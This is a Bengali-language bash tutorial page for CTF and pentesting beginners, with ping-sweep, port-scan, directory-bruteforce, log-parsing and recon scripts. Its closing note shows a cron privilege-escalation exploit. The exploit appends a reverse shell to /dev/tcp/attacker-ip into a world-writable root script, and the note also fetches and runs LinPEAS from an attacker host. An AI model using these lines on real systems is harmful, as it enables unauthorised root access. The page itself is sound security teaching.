@@ -1,0 +1,309 @@
+---
+title: Automation Scripts
+description: Real-world bash scripts — ping sweep, port scan, log parsing, recon automation।
+---
+
+import { Callout } from 'nextra/components'
+
+# Automation Scripts
+
+<Callout type="info">
+  Bash basics শিখেছো। এখন সেগুলো দিয়ে real কাজের scripts তৈরি করবো। এই page-এ CTF এবং pentesting-এ কাজে লাগে এমন scripts দেখবে — অন্ধের মতো copy না করে প্রতিটা line বুঝে নাও।
+</Callout>
+
+## Script তৈরির Template
+
+প্রতিটা script এই structure দিয়ে শুরু করো:
+
+```bash filename="template.sh"
+#!/bin/bash
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# Argument check
+if [ $# -lt 1 ]; then
+  echo "Usage: $0 <argument>"
+  exit 1
+fi
+
+# Main logic এখানে
+```
+
+## Script 1 — Ping Sweep
+
+Network-এর কোন কোন machine alive সেটা বের করো।
+
+```bash filename="ping_sweep.sh"
+#!/bin/bash
+
+# Usage: ./ping_sweep.sh 192.168.1
+# এই script 192.168.1.1 থেকে 192.168.1.254 পর্যন্ত ping করবে
+
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <network-prefix>"
+  echo "Example: $0 192.168.1"
+  exit 1
+fi
+
+network=$1
+
+echo -e "\033[1;33m[*] Pinging $network.1-254...\033[0m"
+
+for host in {1..254}; do
+  # ping করো — 1টা packet, 1 সেকেন্ড timeout
+  # &>/dev/null মানে সব output লুকাও
+  ping -c 1 -W 1 $network.$host &>/dev/null
+
+  # $? হলো আগের command-এর exit code
+  # 0 = সফল (alive), অন্য কিছু = ব্যর্থ (unreachable)
+  if [ $? -eq 0 ]; then
+    echo -e "\033[0;32m[+] $network.$host is alive\033[0m"
+  fi
+done
+
+echo -e "\033[1;33m[*] Ping sweep complete\033[0m"
+```
+
+```bash filename="Terminal"
+chmod +x ping_sweep.sh
+./ping_sweep.sh 192.168.1
+# [*] Pinging 192.168.1.1-254...
+# [+] 192.168.1.1 is alive
+# [+] 192.168.1.100 is alive
+# [*] Ping sweep complete
+```
+
+**Script-এর নতুন concepts:**
+- `$?` — আগের command সফল হয়েছে কি ব্যর্থ, সেটার exit code
+- `&>/dev/null` — stdout এবং stderr দুটোই লুকাও
+
+## Script 2 — Port Scanner
+
+একটা target-এর নির্দিষ্ট port range scan করো।
+
+```bash filename="port_scan.sh"
+#!/bin/bash
+
+# Usage: ./port_scan.sh <target-ip> <start-port> <end-port>
+
+if [ $# -lt 3 ]; then
+  echo "Usage: $0 <target> <start-port> <end-port>"
+  echo "Example: $0 10.10.10.50 1 1000"
+  exit 1
+fi
+
+target=$1
+start_port=$2
+end_port=$3
+
+echo -e "\033[1;33m[*] Scanning $target ports $start_port-$end_port\033[0m"
+
+for port in $(seq $start_port $end_port); do
+  # nc দিয়ে port check করো — 1 সেকেন্ড timeout
+  nc -zv -w 1 $target $port &>/dev/null 2>&1
+
+  if [ $? -eq 0 ]; then
+    echo -e "\033[0;32m[+] Port $port is OPEN\033[0m"
+  fi
+done
+
+echo -e "\033[1;33m[*] Scan complete\033[0m"
+```
+
+```bash filename="Terminal"
+chmod +x port_scan.sh
+./port_scan.sh 10.10.10.50 1 100
+# [*] Scanning 10.10.10.50 ports 1-100
+# [+] Port 22 is OPEN
+# [+] Port 80 is OPEN
+# [*] Scan complete
+```
+
+<Callout type="default">
+  **এটা শেখার জন্য।** Real CTF-এ nmap ব্যবহার করো — এটা অনেক দ্রুত এবং নির্ভরযোগ্য। কিন্তু এই script দিয়ে বুঝবে loop আর exit code কীভাবে কাজে লাগে।
+</Callout>
+
+## Script 3 — Wordlist থেকে Directory Bruteforce
+
+একটা website-এর hidden directories খোঁজো।
+
+```bash filename="dir_brute.sh"
+#!/bin/bash
+
+# Usage: ./dir_brute.sh <url> <wordlist>
+
+if [ $# -lt 2 ]; then
+  echo "Usage: $0 <url> <wordlist>"
+  echo "Example: $0 http://10.10.10.50 /usr/share/wordlists/dirb/common.txt"
+  exit 1
+fi
+
+url=$1
+wordlist=$2
+
+if [ ! -f "$wordlist" ]; then
+  echo "[-] Wordlist file not found: $wordlist"
+  exit 1
+fi
+
+echo "[*] Bruteforcing $url with $wordlist"
+
+while read -r word; do
+  # curl দিয়ে HTTP status code বের করো
+  # -s = silent, -o /dev/null = body লুকাও, -w = format output
+  status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$word")
+
+  # 200 বা 301/302 = found
+  if [[ "$status" == "200" || "$status" == "301" || "$status" == "302" ]]; then
+    echo "[+] Found: $url/$word (Status: $status)"
+  fi
+done < "$wordlist"
+
+echo "[*] Done"
+```
+
+**নতুন concept — `[[ ... ]]` এবং `||`:**
+
+```bash filename="Terminal"
+# [[ ]] হলো আরও powerful condition check
+# || মানে OR — যেকোনো একটা সত্য হলে চলবে
+if [[ "$status" == "200" || "$status" == "301" ]]; then
+  echo "Found!"
+fi
+```
+
+## Script 4 — Log Parsing
+
+Access log থেকে suspicious activity খোঁজো।
+
+```bash filename="log_parser.sh"
+#!/bin/bash
+
+# Usage: ./log_parser.sh <log-file>
+
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <access.log>"
+  exit 1
+fi
+
+logfile=$1
+
+if [ ! -f "$logfile" ]; then
+  echo "[-] Log file not found"
+  exit 1
+fi
+
+echo "=== Top 10 IP Addresses ==="
+# awk দিয়ে প্রথম column (IP) বের করো, sort করো, count করো
+awk '{print $1}' $logfile | sort | uniq -c | sort -rn | head -10
+
+echo ""
+echo "=== 404 Errors ==="
+# 404 status code সহ lines বের করো
+grep " 404 " $logfile | awk '{print $7}' | sort | uniq -c | sort -rn | head -10
+
+echo ""
+echo "=== POST Requests (possible attack) ==="
+grep "POST" $logfile | awk '{print $1, $7}' | sort | uniq -c | sort -rn | head -10
+```
+
+```bash filename="Terminal"
+./log_parser.sh /var/log/apache2/access.log
+# === Top 10 IP Addresses ===
+#     523 192.168.1.50
+#     421 10.0.0.1
+# ...
+```
+
+## Script 5 — Recon Script
+
+TryHackMe box-এ initial recon automate করো।
+
+```bash filename="recon.sh"
+#!/bin/bash
+
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <target-ip>"
+  exit 1
+fi
+
+target=$1
+output_dir="recon_$target"
+
+# Output folder তৈরি করো
+mkdir -p $output_dir
+echo "[*] Output: $output_dir/"
+
+# Ping check
+echo "[*] Ping test..."
+ping -c 3 $target &>/dev/null
+if [ $? -eq 0 ]; then
+  echo "[+] Target is alive"
+else
+  echo "[-] Target not responding to ping"
+fi
+
+# Quick port scan
+echo "[*] Quick port scan (top 100 ports)..."
+nmap -F $target -oN $output_dir/ports.txt 2>/dev/null
+echo "[+] Port scan saved: $output_dir/ports.txt"
+
+# Web check
+echo "[*] Checking port 80..."
+status=$(curl -s -o /dev/null -w "%{http_code}" http://$target 2>/dev/null)
+if [ "$status" == "200" ]; then
+  echo "[+] Web server running on port 80"
+  curl -s -I http://$target > $output_dir/http_headers.txt
+  echo "[+] Headers saved: $output_dir/http_headers.txt"
+fi
+
+echo "[*] Recon complete. Check $output_dir/"
+```
+
+## CyberSec Note
+
+<Callout type="warning">
+  **Script security — attacker এবং defender:**
+
+  **Cron job + writable script = Privilege Escalation:**
+
+  ```bash filename="Terminal"
+  # Cron jobs দেখো — root কোন script চালাচ্ছে
+  cat /etc/crontab
+  # */5 * * * * root /opt/backup.sh    ← root প্রতি ৫ মিনিটে চালায়
+
+  # Script writable কিনা দেখো
+  ls -la /opt/backup.sh
+  # -rwxrwxrwx    ← সবাই edit করতে পারে — বিপজ্জনক
+
+  # Exploit: script-এ reverse shell যোগ করো
+  echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /opt/backup.sh
+  # ৫ মিনিট অপেক্ষা করো — root shell পাবে
+  ```
+
+  **LinPEAS/LinEnum:** CTF-এ initial shell পাওয়ার পর এই scripts চালাও — automatically writable cron jobs, SUID files, সব খুঁজে দেয়।
+
+  ```bash filename="Terminal"
+  wget http://attacker-ip/linpeas.sh -O /tmp/linpeas.sh
+  chmod +x /tmp/linpeas.sh
+  /tmp/linpeas.sh
+  ```
+</Callout>
+
+## Quick Check
+
+- [ ] `$?` মানে কী এবং কখন ব্যবহার হয়?
+- [ ] `&>/dev/null` কী করে?
+- [ ] `while read -r word; do ... done < wordlist.txt` — এটা কীভাবে কাজ করে?
+- [ ] Cron job + writable script কীভাবে privilege escalation-এ কাজে লাগে?
+- [ ] `curl -s -o /dev/null -w "%{http_code}"` — প্রতিটা flag কী করে?
+
+**পরবর্তী Section →** [Cheatsheet](/docs/linux-fundamentals/cheatsheet)
+
+<span style={{ display: 'none' }}>
+  Search Keywords: bash automation script bangla, ping sweep bash, port scanner bash, bash CTF script Bengali, directory bruteforce bash, cron privilege escalation bash script
+</span>
